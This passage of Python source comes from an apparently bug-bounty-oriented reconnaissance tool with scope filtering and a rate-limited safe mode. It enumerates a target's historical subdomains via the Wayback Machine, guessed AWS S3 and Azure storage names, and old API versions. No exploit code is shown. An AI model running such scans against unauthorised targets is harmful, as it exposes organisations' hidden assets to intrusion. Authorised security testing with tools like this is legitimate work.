            print(colored("║", 'blue'))
            print(colored("╚" + "═" * 68 + "╝", 'blue'))
            print()
            
            choice = input(colored("Choose option: ", 'cyan', attrs=['bold']))
            
            if choice == '1':
                self.add_in_scope()
            elif choice == '2':
                self.add_out_of_scope()
            elif choice == '3':
                self.view_scope()
            elif choice == '4':
                self.toggle_scope_filtering()
            elif choice == '5':
                self.clear_scope()
            elif choice == '6':
                self.apply_scope_filter()

            elif choice.upper() == 'B':
                # Bug Bounty Safe Mode Configuration
                print()
                print(colored("╔" + "═" * 68 + "╗", 'green'))
                print(colored("║  BUG BOUNTY SAFE MODE CONFIGURATION".center(70) + "║", 'green', attrs=['bold']))
                print(colored("╠" + "═" * 68 + "╣", 'green'))
                print(colored("║", 'green'))
                print(colored("║  This mode ensures compliance with bug bounty programs:", 'white'))
                print(colored("║", 'green'))
                print(colored("║  ENABLED PROTECTIONS:", 'yellow', attrs=['bold']))
                print(colored("║    • Rate limiting (10 requests/second default)", 'white'))
                print(colored("║    • Scope filtering (only test in-scope targets)", 'white'))
                print(colored("║    • Request delays to avoid DoS flags", 'white'))
                print(colored("║    • robots.txt respect", 'white'))
                print(colored("║    • Request counting and logging", 'white'))
                print(colored("║", 'green'))
                print(colored("╚" + "═" * 68 + "╝", 'green'))
                print()
                
                confirm = input(colored("[?] Enable Bug Bounty Safe Mode? (y/n): ", 'yellow')).lower()
                if confirm == 'y':
                    # Configure rate limit
                    print()
                    rate_input = input(colored("[?] Max requests per second (default 10, max 50): ", 'cyan'))
                    if rate_input.isdigit():
                        rate = min(int(rate_input), 50)
                        self.max_requests_per_second = rate
                        self.request_delay = 1.0 / rate
                    
                    # Configure scope
                    print()
                    print(colored("[*] Configure scope (one domain per line, empty to finish)", 'cyan'))
                    print(colored("    Example: *.example.com or api.example.com", 'white'))
                    print()
                    
                    while True:
                        scope_input = input(colored("    In-scope domain: ", 'green')).strip()
                        if not scope_input:
                            break
                        self.in_scope.append(scope_input)
                        print(colored(f"    Added: {scope_input}", 'green'))
                    
                    if self.in_scope:
                        print()
                        print(colored("[*] Out-of-scope domains (optional)", 'cyan'))
                        while True:
                            out_input = input(colored("    Out-of-scope domain: ", 'red')).strip()
                            if not out_input:
                                break
                            self.out_of_scope.append(out_input)
                            print(colored(f"    Excluded: {out_input}", 'red'))
                    
                    # Enable mode
                    self.enable_bug_bounty_mode()
                    
                    print(colored("╔" + "═" * 68 + "╗", 'green'))
                    print(colored("║  SAFE MODE ACTIVE".center(70) + "║", 'green', attrs=['bold']))
                    print(colored("╠" + "═" * 68 + "╣", 'green'))
                    print(colored("║", 'green'))
                    print(colored(f"║  Rate Limit: {self.max_requests_per_second} req/s".ljust(70) + "║", 'white'))
                    print(colored(f"║  In-Scope: {len(self.in_scope)} domains".ljust(70) + "║", 'white'))
                    print(colored(f"║  Out-of-Scope: {len(self.out_of_scope)} domains".ljust(70) + "║", 'white'))
                    print(colored("║", 'green'))
                    print(colored("╚" + "═" * 68 + "╝", 'green'))
                    print()
                    
                    input(colored("[*] Press Enter to continue...", 'yellow'))
            elif choice == '0':
                break
            else:
                print(colored("[!] Invalid choice", 'red'))
                time.sleep(1)
    
    def add_in_scope(self):
        """add domains/URLs to in-scope list"""
        print()
        print(colored("╔" + "═" * 68 + "╗", 'green'))
        print(colored("║" + "  ADD IN-SCOPE ITEMS".ljust(68) + "║", 'green', attrs=['bold']))
        print(colored("╚" + "═" * 68 + "╝", 'green'))
        print()
        print("Enter domains/URLs/patterns (one per line)")
        print(colored("Examples:", 'yellow'))
        print("  • example.com (matches *.example.com)")
        print("  • api.example.com (exact subdomain)")
        print("  • https://example.com/api/* (URL pattern)")
        print("  • *.prod.example.com (wildcard subdomain)")
        print()
        print(colored("Type 'done' when finished, or 'cancel' to abort:", 'cyan'))
        print()
        
        items = []
        while True:
            line = input(colored("  → ", 'green')).strip()
            if line.lower() == 'done':
                break
            elif line.lower() == 'cancel':
                print(colored("[!] Cancelled", 'yellow'))
                return
            elif line:
                items.append(line)
                print(colored(f"    ✓ Added: {line}", 'green'))
        
        if items:
            self.in_scope.extend(items)
            print()
            print(colored(f"[+] Added {len(items)} item(s) to in-scope list", 'green'))
        else:
            print(colored("[!] No items added", 'yellow'))
        
        input(colored("\n[Press Enter to continue]", 'yellow'))
    
    def add_out_of_scope(self):
        """add domains/URLs to out-of-scope list"""
        print()
        print(colored("╔" + "═" * 68 + "╗", 'red'))
        print(colored("║" + "  ADD OUT-OF-SCOPE ITEMS".ljust(68) + "║", 'red', attrs=['bold']))
        print(colored("╚" + "═" * 68 + "╝", 'red'))
        print()
        print("Enter domains/URLs/patterns to EXCLUDE (one per line)")
        print(colored("Examples:", 'yellow'))
        print("  • test.example.com (exclude test subdomain)")
        print("  • *.staging.example.com (exclude all staging)")
        print("  • https://example.com/admin/* (exclude admin URLs)")
        print()
        print(colored("Type 'done' when finished, or 'cancel' to abort:", 'cyan'))
        print()
        
        items = []
        while True:
            line = input(colored("  → ", 'red')).strip()
            if line.lower() == 'done':
                break
            elif line.lower() == 'cancel':
                print(colored("[!] Cancelled", 'yellow'))
                return
            elif line:
                items.append(line)
                print(colored(f"    ✓ Added: {line}", 'red'))
        
        if items:
            self.out_of_scope.extend(items)
            print()
            print(colored(f"[+] Added {len(items)} item(s) to out-of-scope list", 'green'))
        else:
            print(colored("[!] No items added", 'yellow'))
        
        input(colored("\n[Press Enter to continue]", 'yellow'))
    
    def view_scope(self):
        """view current scope configuration"""
        print()
        print(colored("╔" + "═" * 68 + "╗", 'cyan'))
        print(colored("║" + "  CURRENT SCOPE CONFIGURATION".ljust(68) + "║", 'cyan', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'cyan'))
        print()
        
        # Show filtering status
        if self.scope_enabled:
            print(colored("  Status: ", 'white') + colored("ENABLED", 'green', attrs=['bold']))
            print(colored("  → Only in-scope items will be shown", 'white'))
        else:
            print(colored("  Status: ", 'white') + colored("DISABLED", 'red', attrs=['bold']))
            print(colored("  → All items will be shown (no filtering)", 'white'))
        
        print()
        
        # Show in-scope items
        if self.in_scope:
            print(colored("  ✓ IN-SCOPE ITEMS:", 'green', attrs=['bold']))
            for i, item in enumerate(self.in_scope, 1):
                print(colored(f"    {i}. ", 'green') + item)
        else:
            print(colored("  ✓ IN-SCOPE ITEMS:", 'green', attrs=['bold']))
            print(colored("    (none defined - all items allowed)", 'yellow'))
        
        print()
        
        # Show out-of-scope items
        if self.out_of_scope:
            print(colored("   OUT-OF-SCOPE ITEMS:", 'red', attrs=['bold']))
            for i, item in enumerate(self.out_of_scope, 1):
                print(colored(f"    {i}. ", 'red') + item)
        else:
            print(colored("   OUT-OF-SCOPE ITEMS:", 'red', attrs=['bold']))
            print(colored("    (none defined)", 'yellow'))
        
        print()
        print(colored("╚" + "═" * 68 + "╝", 'cyan'))
        
        input(colored("\n[Press Enter to continue]", 'yellow'))
    
    def toggle_scope_filtering(self):
        """toggle scope filtering on/off"""
        self.scope_enabled = not self.scope_enabled
        
        if self.scope_enabled:
            print()
            print(colored("[+] Scope filtering ENABLED", 'green', attrs=['bold']))
            print(colored("    → Only in-scope items will be processed", 'white'))
            if not self.in_scope:
                print(colored("    ⚠ Warning: No in-scope items defined!", 'yellow'))
                print(colored("    → Add in-scope items or all findings will be filtered out", 'yellow'))
        else:
            print()
            print(colored("[!] Scope filtering DISABLED", 'yellow', attrs=['bold']))
            print(colored("    → All items will be processed (no filtering)", 'white'))
        
        time.sleep(2)
    
    def clear_scope(self):
        """clear all scope rules"""
        print()
        confirm = input(colored("⚠ Clear ALL scope rules? (yes/no): ", 'yellow')).strip().lower()
        
        if confirm == 'yes':
            self.in_scope = []
            self.out_of_scope = []
            self.scope_enabled = False
            print(colored("[+] All scope rules cleared", 'green'))
        else:
            print(colored("[!] Cancelled", 'yellow'))
        
        time.sleep(1)
    
    def apply_scope_filter(self):
        """filter current findings by scope"""
        if not self.scope_enabled:
            print()
            print(colored("[!] Scope filtering is currently DISABLED", 'yellow'))
            print(colored("    Enable it first with option 4", 'white'))
            time.sleep(2)
            return
        
        if not self.in_scope and not self.out_of_scope:
            print()
            print(colored("[!] No scope rules defined", 'yellow'))
            print(colored("    Add in-scope or out-of-scope items first", 'white'))
            time.sleep(2)
            return
        
        print()
        print(colored("[*] Applying scope filters...", 'cyan'))
        
        # Count before filtering
        vulns_before = len(self.vulnerabilities)
        endpoints_before = len(self.endpoints)
        subdomains_before = len(self.subdomains)
        
        # Filter vulnerabilities
        filtered_vulns = []
        for vuln in self.vulnerabilities:
            url = vuln.get('url', '')
            if self.is_in_scope(url):
                filtered_vulns.append(vuln)
        
        # Filter endpoints
        filtered_endpoints = set()
        for endpoint in self.endpoints:
            if self.is_in_scope(endpoint):
                filtered_endpoints.add(endpoint)
        
        # Filter subdomains
        filtered_subdomains = set()
        for subdomain in self.subdomains:
            if self.is_in_scope(subdomain):
                filtered_subdomains.add(subdomain)
        
        # Update findings
        self.vulnerabilities = filtered_vulns
        self.endpoints = filtered_endpoints
        self.subdomains = filtered_subdomains
        
        # Show results
        print()
        print(colored("╔" + "═" * 68 + "╗", 'green'))
        print(colored("║" + "  SCOPE FILTERING COMPLETE".ljust(68) + "║", 'green', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'green'))
        print(colored("║", 'green'))
        print(colored("║  ", 'green') + f"Vulnerabilities: {vulns_before} → {len(self.vulnerabilities)} ({vulns_before - len(self.vulnerabilities)} filtered)".ljust(68) + colored("║", 'green'))
        print(colored("║  ", 'green') + f"Endpoints: {endpoints_before} → {len(self.endpoints)} ({endpoints_before - len(self.endpoints)} filtered)".ljust(68) + colored("║", 'green'))
        print(colored("║  ", 'green') + f"Subdomains: {subdomains_before} → {len(self.subdomains)} ({subdomains_before - len(self.subdomains)} filtered)".ljust(68) + colored("║", 'green'))
        print(colored("║", 'green'))
        print(colored("╚" + "═" * 68 + "╝", 'green'))
        
        input(colored("\n[Press Enter to continue]", 'yellow'))
    
    def is_in_scope(self, url_or_domain):
        """check if URL/domain is in scope"""
        if not url_or_domain:
            return False
        
        # If no in-scope rules, allow everything (unless out-of-scope)
        if not self.in_scope:
            in_scope = True
        else:
            # Check if matches any in-scope rule
            in_scope = False
            for scope_item in self.in_scope:
                if self.matches_scope_pattern(url_or_domain, scope_item):
                    in_scope = True
                    break
        
        # Check out-of-scope rules
        if in_scope and self.out_of_scope:
            for scope_item in self.out_of_scope:
                if self.matches_scope_pattern(url_or_domain, scope_item):
                    in_scope = False
                    break
        
        return in_scope
    
    def matches_scope_pattern(self, url_or_domain, pattern):
        """check if URL/domain matches scope pattern"""
        url_or_domain = url_or_domain.lower()
        pattern = pattern.lower()
        
        # Extract domain from URL if needed
        if '://' in url_or_domain:
            try:
                domain = url_or_domain.split('://')[1].split('/')[0]
            except:
                domain = url_or_domain
        else:
            domain = url_or_domain
        
        # Handle wildcard patterns
        if '*' in pattern:
            # Convert wildcard to regex
            import re
            regex_pattern = pattern.replace('.', '\\.').replace('*', '.*')
            if re.search(regex_pattern, domain) or re.search(regex_pattern, url_or_domain):
                return True
        
        # Exact match
        if pattern in domain or pattern in url_or_domain:
            return True
        
        # Check if it's a subdomain match
        if domain.endswith('.' + pattern) or domain == pattern:
            return True
        
        return False
    
    def configure_bug_bounty_mode(self):
        """configure bug bounty safe mode settings"""
        print()
        print(colored("╔" + "═" * 68 + "╗", 'green'))
        print(colored("║  BUG BOUNTY SAFE MODE CONFIGURATION".center(70) + "║", 'green', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'green'))
        print(colored("║", 'green'))
        print(colored("║  This mode ensures compliance with bug bounty programs:", 'white'))
        print(colored("║", 'green'))
        print(colored("║  ENABLED PROTECTIONS:", 'yellow', attrs=['bold']))
        print(colored("║    • Rate limiting (10 requests/second default)", 'white'))
        print(colored("║    • Scope filtering (only test in-scope targets)", 'white'))
        print(colored("║    • Request delays to avoid DoS flags", 'white'))
        print(colored("║    • robots.txt respect", 'white'))
        print(colored("║    • Request counting and logging", 'white'))
        print(colored("║", 'green'))
        print(colored("╚" + "═" * 68 + "╝", 'green'))
        print()
        
        confirm = input(colored("[?] Enable Bug Bounty Safe Mode? (y/n): ", 'yellow')).lower()
        if confirm == 'y':
            print()
            rate_input = input(colored("[?] Max requests per second (default 10, max 50): ", 'cyan'))
            if rate_input.isdigit():
                rate = min(int(rate_input), 50)
                self.max_requests_per_second = rate
                self.request_delay = 1.0 / rate
            
            print()
            print(colored("[*] Configure scope (one domain per line, empty to finish)", 'cyan'))
            print(colored("    Example: *.example.com or api.example.com", 'white'))
            print()
            
            while True:
                scope_input = input(colored("    In-scope domain: ", 'green')).strip()
                if not scope_input:
                    break
                self.in_scope.append(scope_input)
                print(colored(f"    Added: {scope_input}", 'green'))
            
            if self.in_scope:
                print()
                print(colored("[*] Out-of-scope domains (optional)", 'cyan'))
                while True:
                    out_input = input(colored("    Out-of-scope domain: ", 'red')).strip()
                    if not out_input:
                        break
                    self.out_of_scope.append(out_input)
                    print(colored(f"    Excluded: {out_input}", 'red'))
            
            self.enable_bug_bounty_mode()
            
            print()
            print(colored("╔" + "═" * 68 + "╗", 'green'))
            print(colored("║  SAFE MODE ACTIVE".center(70) + "║", 'green', attrs=['bold']))
            print(colored("╠" + "═" * 68 + "╣", 'green'))
            print(colored("║", 'green'))
            print(colored(f"║  Rate Limit: {self.max_requests_per_second} req/s".ljust(70) + "║", 'white'))
            print(colored(f"║  In-Scope: {len(self.in_scope)} domains".ljust(70) + "║", 'white'))
            print(colored(f"║  Out-of-Scope: {len(self.out_of_scope)} domains".ljust(70) + "║", 'white'))
            print(colored("║", 'green'))
            print(colored("╚" + "═" * 68 + "╝", 'green'))
            print()
            
            input(colored("[*] Press Enter to continue...", 'yellow'))
    
    def show_main_menu(self):
        """display sweet interactive menu"""
        print()
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "  MAIN MENU".ljust(68) + "║", 'blue', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue'))
        print(colored("║  ", 'blue') + colored("1", 'cyan', attrs=['bold']) + "  Shadow Recon      " + colored("→", 'blue') + "  Elite hidden asset discovery".ljust(45) + colored("║", 'blue'))
        print(colored("║  ", 'blue') + colored("2", 'cyan', attrs=['bold']) + "  Chain Hunter      " + colored("→", 'blue') + "  Find vulnerability chains".ljust(45) + colored("║", 'blue'))
        print(colored("║  ", 'blue') + colored("3", 'cyan', attrs=['bold']) + "  Exploit Mapper    " + colored("→", 'blue') + "  Generate exploit PoCs".ljust(45) + colored("║", 'blue'))
        print(colored("║  ", 'blue') + colored("4", 'cyan', attrs=['bold']) + "  Full Analysis     " + colored("→", 'blue') + "  Run all modules".ljust(45) + colored("║", 'blue'))
        print(colored("║", 'blue'))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║  ", 'blue') + colored("5", 'yellow', attrs=['bold']) + "  View Findings     " + colored("→", 'blue') + "  Show current results".ljust(45) + colored("║", 'blue'))
        print(colored("║  ", 'blue') + colored("6", 'green', attrs=['bold']) + "  Generate Report   " + colored("→", 'blue') + "  Create report & exit".ljust(45) + colored("║", 'blue'))
        print(colored("║  ", 'blue') + colored("7", 'magenta', attrs=['bold']) + "  Beginner Mode     " + colored("→", 'blue') + "  Smart recommendation + guide".ljust(45) + colored("║", 'blue'))
        print(colored("║  ", 'blue') + colored("8", 'cyan', attrs=['bold']) + "  Scope Manager     " + colored("→", 'blue') + "  Set in-scope/out-of-scope".ljust(45) + colored("║", 'blue'))
        print(colored("║  ", 'blue') + colored("9", 'green', attrs=['bold']) + "  Bug Bounty Mode   " + colored("→", 'blue') + "  Enable safe mode for bug bounty".ljust(45) + colored("║", 'blue'))
        print(colored("║", 'blue'))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║  ", 'blue') + colored("0", 'red', attrs=['bold']) + "  Exit              " + colored("→", 'blue') + "  Quit without report".ljust(45) + colored("║", 'blue'))
        print(colored("║", 'blue'))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
    
    def view_findings(self):
        """view current findings summary"""
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "  CURRENT FINDINGS".ljust(68) + "║", 'yellow', attrs=['bold']))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        print()
        
        # shadow assets
        if self.shadow_assets:
            print(colored(f"[Shadow Assets: {len(self.shadow_assets)} found]", 'cyan', attrs=['bold']))
            for i, asset in enumerate(self.shadow_assets[:5], 1):
                asset_type = asset.get('type', 'Unknown')
                asset_url = asset.get('url', '')[:50]
                print(f"  {i}. [{colored(asset_type, 'yellow')}] {asset_url}")
            if len(self.shadow_assets) > 5:
                print(f"  ... and {len(self.shadow_assets) - 5} more")
        else:
            print(colored("[Shadow Assets: None yet - run Shadow Recon]", 'white'))
        
        print()
        
        # chains
        if self.chains:
            print(colored(f"[Vulnerability Chains: {len(self.chains)} found]", 'cyan', attrs=['bold']))
            for i, chain in enumerate(self.chains, 1):
                name = chain.get('name', 'Unknown')
                severity = chain.get('severity', 'UNKNOWN')
                bounty = chain.get('bounty_estimate', 'Unknown')
                sev_color = 'red' if severity == 'CRITICAL' else 'yellow'
                print(f"  {i}. [{colored(severity, sev_color)}] {name}")
                print(f"     Bounty: {colored(bounty, 'green')}")
        else:
            print(colored("[Vulnerability Chains: None yet - run Chain Hunter]", 'white'))
        
        print()
        
        # exploit guides
        if self.exploit_guides:
            print(colored(f"[Exploit Guides: {len(self.exploit_guides)} generated]", 'cyan', attrs=['bold']))
            for i, guide in enumerate(self.exploit_guides[:3], 1):
                title = guide.get('title', 'Unknown')[:60]
                print(f"  {i}. {title}")
            if len(self.exploit_guides) > 3:
                print(f"  ... and {len(self.exploit_guides) - 3} more")
        else:
            print(colored("[Exploit Guides: None yet - run Exploit Mapper]", 'white'))
        
        print()
    
    def shadow_recon(self):
        """ELITE shadow recon - 10x better asset discovery"""
        self.log("PHASE 1: ELITE SHADOW RECON", "phase")
        
        if not self.target:
            self.log("No target specified - skipping shadow recon", "error")
            return
        
        self.log("Elite hidden asset discovery activated...", "info")
        print()
        
        # show what we're doing
        print(colored("    [ELITE SHADOW RECON ACTIVATED]", 'cyan', attrs=['bold']))
        print(colored("    → Elite cloud storage discovery (AWS/Azure/GCP)", 'white'))
        print(colored("    → Certificate transparency logs", 'white'))
        print(colored("    → GitHub intelligence gathering", 'white'))
        print(colored("    → Multi-source DNS history", 'white'))
        print(colored("    → Acquisition intelligence", 'white'))
        print(colored("    → Technology fingerprinting", 'white'))
        print()
        
        # 1. Historical subdomains from Wayback
        self.historical_subdomains()
        print()
        
        # 2. ELITE: Multi-cloud storage discovery (50+ patterns)
        self.elite_cloud_storage_discovery()
        print()
        
        # 3. ELITE: Certificate transparency logs
        self.certificate_transparency_discovery()
        print()
        
        # 4. ELITE: GitHub intelligence
        self.github_intelligence_discovery()
        print()
        
        # 5. ELITE: DNS history from multiple sources
        self.dns_history_discovery()
        print()
        
        # 6. ELITE: Acquisition intelligence
        self.acquisition_intelligence_discovery()
        print()
        
        # 7. ELITE: Technology-specific discovery
        self.technology_specific_discovery()
        print()
        
        # 8. Old API versions
        self.find_old_apis()
        print()
        
        # 9. Check acquisitions
        self.check_acquisitions()
        
        # summary with fancy box
        print()
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "  ELITE SHADOW RECON COMPLETE".ljust(68) + "║", 'green', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + f"  Shadow assets discovered: {colored(str(len(self.shadow_assets)), 'yellow', attrs=['bold'])}".ljust(88) + colored("║", 'blue'))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        
        # Show critical findings first
        critical_assets = [a for a in self.shadow_assets if a.get('severity') == 'CRITICAL']
        if critical_assets:
            print()
            print(colored("    [CRITICAL SHADOW ASSETS]", 'red', attrs=['bold']))
            for i, asset in enumerate(critical_assets[:5], 1):
                asset_type = asset.get('type', 'Unknown')
                asset_url = asset.get('url', '')[:60]
                asset_note = asset.get('note', '')
                print(f"    {i}. [{colored(asset_type, 'yellow')}] {asset_url}")
                print(f"       {colored(asset_note, 'red')}")
            
            if len(critical_assets) > 5:
                print(f"    ... and {len(critical_assets) - 5} more critical assets")
        
        # Show top findings
        if self.shadow_assets:
            print()
            print(colored("    [TOP FINDINGS]", 'yellow', attrs=['bold']))
            for i, asset in enumerate(self.shadow_assets[:5], 1):
                asset_type = asset.get('type', 'Unknown')
                asset_url = asset.get('url', '')
                severity = asset.get('severity', 'MEDIUM')
                
                # severity color
                if severity == 'CRITICAL':
                    sev_color = 'red'
                elif severity == 'HIGH':
                    sev_color = 'yellow'
                else:
                    sev_color = 'white'
                
                print(f"    {i}. [{colored(asset_type, 'cyan')}] {asset_url}")
                print(f"       {colored(asset.get('note', ''), sev_color)}")
            
            if len(self.shadow_assets) > 5:
                print(f"    ... and {len(self.shadow_assets) - 5} more (view all in report)")
        print()
    
    def historical_subdomains(self):
        """find old subdomains from wayback machine"""
        self.log("Checking Wayback Machine for historical subdomains...", "info")
        
        try:
            # wayback machine cdx api - free!
            url = f"http://web.archive.org/cdx/search/cdx"
            params = {
                'url': f'*.{self.target}/*',
                'matchType': 'domain',
                'collapse': 'urlkey',
                'output': 'json',
                'fl': 'original',
                'limit': 10000
            }
            
            print(colored("    → Querying Wayback Machine CDX API...", 'cyan'))
            r = requests.get(url, params=params, timeout=30)
            
            if r.status_code == 200:
                data = r.json()
                total_entries = len(data) - 1  # skip header
                
                print(colored(f"    → Processing {total_entries} archived URLs...", 'cyan'))
                
                old_subs = set()
                processed = 0
                
                for entry in data[1:]:  # skip header
                    try:
                        archived_url = entry[0]
                        parsed = urlparse(archived_url)
                        subdomain = parsed.netloc
                        
                        processed += 1
                        
                        # progress bar
                        if processed % 100 == 0 or processed == total_entries:
                            percent = (processed / total_entries) * 100
                            bar_length = 40
                            filled = int(bar_length * processed / total_entries)
                            bar = '█' * filled + '░' * (bar_length - filled)
                            print(f"\r    [{colored(bar, 'blue')}] {percent:.1f}% | Found: {len(old_subs)}", end='', flush=True)
                        
                        # only add if we didn't already know about it
                        if subdomain and subdomain not in self.subdomains:
                            old_subs.add(subdomain)
                    except:
                        pass
                
                print()  # newline after progress
                
                if old_subs:
                    self.log(f"Found {len(old_subs)} historical subdomains", "success")
                    for sub in old_subs:
                        self.shadow_assets.append({
                            'type': 'Historical Subdomain',
                            'url': f'https://{sub}',
                            'source': 'Archive.org',
                            'note': 'Old subdomain not in current scan'
                        })
                else:
                    self.log("No new historical subdomains found", "info")
            
        except Exception as e:
            self.log(f"Wayback Machine error: {str(e)[:50]}", "warning")
    
    def find_s3_buckets(self):
        """enumerate possible s3 buckets"""
        self.log("Enumerating S3 buckets...", "info")
        
        # common s3 bucket patterns
        base_name = self.target.split('.')[0]
        
        bucket_patterns = [
            base_name,
            f"{base_name}-dev",
            f"{base_name}-staging",
            f"{base_name}-prod",
            f"{base_name}-backup",
            f"{base_name}-assets",
            f"{base_name}-files",
            f"{base_name}-uploads",
            f"{base_name}-static",
            f"{base_name}-media",
            f"{base_name}-logs",
            f"{base_name}-data",
            f"{base_name}-test",
            f"{base_name}-old",
        ]
        
        found_buckets = []
        total = len(bucket_patterns)
        
        print(colored(f"    → Testing {total} bucket patterns...", 'cyan'))
        
        for i, bucket in enumerate(bucket_patterns, 1):
            # progress bar
            percent = (i / total) * 100
            bar_length = 40
            filled = int(bar_length * i / total)
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | Testing: {bucket[:30]:<30}", end='', flush=True)
            
            try:
                # check if bucket exists
                bucket_url = f"https://{bucket}.s3.amazonaws.com"
                r = requests.get(bucket_url, timeout=3)
                
                # if we get a response (not 404), bucket might exist
                if r.status_code != 404:
                    found_buckets.append(bucket)
                    
                    # check if it's publicly accessible
                    if r.status_code == 200:
                        access = "PUBLIC"
                        severity = "CRITICAL"
                    elif r.status_code == 403:
                        access = "EXISTS (Private)"
                        severity = "MEDIUM"
                    else:
                        access = f"Status {r.status_code}"
                        severity = "LOW"
                    
                    self.shadow_assets.append({
                        'type': 'S3 Bucket',
                        'url': bucket_url,
                        'source': 'Enumeration',
                        'note': f'{access} - {severity}',
                        'severity': severity
                    })
            except:
                pass
        
        print()  # newline after progress
        
        if found_buckets:
            self.log(f"Found {len(found_buckets)} S3 buckets", "success")
        else:
            self.log("No exposed S3 buckets found", "info")
    
    def find_old_apis(self):
        """check for old api versions"""
        self.log("Checking for old API versions...", "info")
        
        # look for api endpoints in our known endpoints
        api_bases = set()
        for endpoint in self.endpoints:
            if 'api' in endpoint:
                parsed = urlparse(endpoint)
                api_bases.add(f"{parsed.scheme}://{parsed.netloc}")
        
        if not api_bases:
            # try common api patterns on known subdomains
            for subdomain in list(self.subdomains)[:10]:  # check first 10
                if not subdomain.startswith('http'):
                    api_bases.add(f"https://api.{subdomain}")
                    api_bases.add(f"https://api-v1.{subdomain}")
        
        # common old version patterns
        old_paths = [
            '/v1', '/v2', '/v3',
            '/api/v1', '/api/v2',
            '/api-v1', '/api-v2',
            '/api-old', '/api-legacy',
            '/rest/v1', '/rest/v2',
        ]
        
        old_versions = []
        total_tests = len(api_bases) * len(old_paths)
        tested = 0
        
        print(colored(f"    → Testing {len(api_bases)} API bases × {len(old_paths)} version paths...", 'cyan'))
        
        for base in api_bases:
            for path in old_paths:
                tested += 1
                
                # progress bar
                percent = (tested / total_tests) * 100
                bar_length = 40
                filled = int(bar_length * tested / total_tests)
                bar = '█' * filled + '░' * (bar_length - filled)
                print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | Found: {len(old_versions)}", end='', flush=True)
                
                try:
                    test_url = f"{base}{path}"
                    r = requests.get(test_url, timeout=3)
                    
                    # if we get anything other than 404, might be old api
                    if r.status_code != 404:
                        old_versions.append(test_url)
                        
                        self.shadow_assets.append({
                            'type': 'Old API Version',
                            'url': test_url,
                            'source': 'Version enumeration',
                            'note': f'Status {r.status_code} - may be unmaintained',
                            'severity': 'HIGH'
                        })
                except:
                    pass
        
        print()  # newline after progress
        
        if old_versions:
            self.log(f"Found {len(old_versions)} old API versions", "success")
        else:
            self.log("No old API versions found", "info")
    
    def check_acquisitions(self):
        """check if target acquired other companies"""
        self.log("Checking for company acquisitions...", "info")
        
        # this would normally scrape crunchbase or similar
        # for now just log that it's a placeholder
        self.log("Acquisition tracking coming in future update", "warning")
    


    # ========== ELITE SHADOW RECON ENHANCEMENTS ==========
    
    def elite_cloud_storage_discovery(self):
        """Elite cloud storage discovery - AWS, Azure, GCP, DigitalOcean"""
        self.log("Elite Cloud Storage Discovery...", "info")
        
        base_name = self.target.split('.')[0]
        company = base_name.replace('-', '').replace('_', '')
        
        # 50+ AWS S3 patterns
        s3_patterns = [
            # Basic patterns
            base_name, f"{base_name}-backup", f"{base_name}-backups",
            
            # Environment patterns
            f"{base_name}-dev", f"{base_name}-development",
            f"{base_name}-staging", f"{base_name}-stage", f"{base_name}-stg",
            f"{base_name}-prod", f"{base_name}-production",
            f"{base_name}-test", f"{base_name}-testing", f"{base_name}-qa",
            f"{base_name}-uat", f"{base_name}-demo",
            
            # Service patterns
            f"{base_name}-api", f"{base_name}-web", f"{base_name}-mobile",
            f"{base_name}-admin", f"{base_name}-cdn", f"{base_name}-static",
            
            # Purpose patterns
            f"{base_name}-assets", f"{base_name}-files", f"{base_name}-uploads",
            f"{base_name}-media", f"{base_name}-images", f"{base_name}-videos",
            f"{base_name}-logs", f"{base_name}-data", f"{base_name}-database",
            f"{base_name}-public", f"{base_name}-private", f"{base_name}-internal",
            
            # Team patterns
            f"{base_name}-engineering", f"{base_name}-ops", f"{base_name}-devops",
            f"{base_name}-security", f"{base_name}-infra",
            
            # Region patterns
            f"{base_name}-us-east-1", f"{base_name}-us-west-2",
            f"{base_name}-eu-west-1", f"{base_name}-ap-south-1",
            
            # Date patterns
            f"{base_name}-2024", f"{base_name}-2023", f"{base_name}-old",
            f"{base_name}-archive", f"{base_name}-legacy",
            
            # Snake case variants
            f"{base_name.replace('-', '_')}", f"{company}_prod",
            f"{company}_staging", f"{company}_backup",
            
            # Concatenated
            f"{company}prod", f"{company}staging", f"{company}backup",
            f"{company}assets", f"{company}uploads",
        ]
        
        print(colored(f"    → Testing {len(s3_patterns)} AWS S3 patterns...", 'cyan'))
        
        for i, bucket in enumerate(s3_patterns, 1):
            percent = (i / len(s3_patterns)) * 100
            bar_length = 40
            filled = int(bar_length * i / len(s3_patterns))
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | AWS S3: {bucket[:25]:<25}", end='', flush=True)
            
            try:
                bucket_url = f"https://{bucket}.s3.amazonaws.com"
                r = requests.get(bucket_url, timeout=2)
                
                if r.status_code != 404:
                    if r.status_code == 200:
                        access = "PUBLIC - CRITICAL"
                        severity = "CRITICAL"
                        self.log(f"PUBLIC S3 bucket found: {bucket}", "success")
                    elif r.status_code == 403:
                        access = "EXISTS (Private)"
                        severity = "MEDIUM"
                    else:
                        access = f"Status {r.status_code}"
                        severity = "LOW"
                    
                    self.shadow_assets.append({
                        'type': 'AWS S3 Bucket',
                        'url': bucket_url,
                        'source': 'Elite Cloud Discovery',
                        'note': access,
                        'severity': severity
                    })
            except:
                pass
        
        print()
        
        # Azure Blob Storage
        azure_patterns = [
            base_name, f"{base_name}prod", f"{base_name}dev",
            f"{base_name}staging", f"{base_name}backup",
            f"{base_name}assets", f"{base_name}storage",
            company, f"{company}prod", f"{company}storage"
        ]
        
